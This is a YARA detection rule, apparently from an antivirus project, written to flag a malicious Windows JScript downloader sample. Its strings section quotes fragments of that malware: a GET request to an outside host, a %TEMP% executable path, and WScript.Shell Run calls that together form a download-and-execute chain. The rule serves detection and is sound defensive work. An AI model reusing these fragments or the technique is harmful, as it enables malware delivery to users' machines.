rule sig_20160329_12aae6dfe54b1f14c5a3f21dcdd08380 {
  meta:
    description = "datamaliciousorder - file 20160329_12aae6dfe54b1f14c5a3f21dcdd08380.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e8e2a7f9886a5c6b83fcaf59879dde4f5826cfef46ba7db788bdea50a3ee12f4"

  strings:
    $s1  = "fO[pp](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function Zl() {return u[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2pxsE88R.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[C](pH() * 11); if (fO[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function c(h, Xr){DO = DO * 1; return h - Xr;};" fullword ascii
    $s5  = "var u = function p() {return WScript[yS](\"WScript.Shell\");}(), d0 = 11;" fullword ascii
    $s6  = "function wv(){return \"\" + Z0;};" fullword ascii
    $s7  = "function iZ(xb){u[\"Run\"](xb, DO, DO);};" fullword ascii
    $s8  = "function e() {return ((M == true) && (M == Vp)) ? 1 : DO;};" fullword ascii
    $s9  = "var Y = new this[\"Date\"]();" fullword ascii
    $s10 = "function Z(Xg) {var E = (1, 2, 3, 4, 5, Xg); return E;};" fullword ascii
    $s11 = "function dP()" fullword ascii
    $s12 = "function v(){return yS;};" fullword ascii
    $s13 = "return c(l, Im);" fullword ascii
    $s14 = "function pH(){return 22;};" fullword ascii
    $s15 = " while (YY){" fullword ascii
    $s16 = "M = true; " fullword ascii
    $s17 = "Vp = true; " fullword ascii
    $s18 = "var Vp = false;" fullword ascii
    $s19 = "var d1 = false;" fullword ascii
    $s20 = "} catch(Te){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}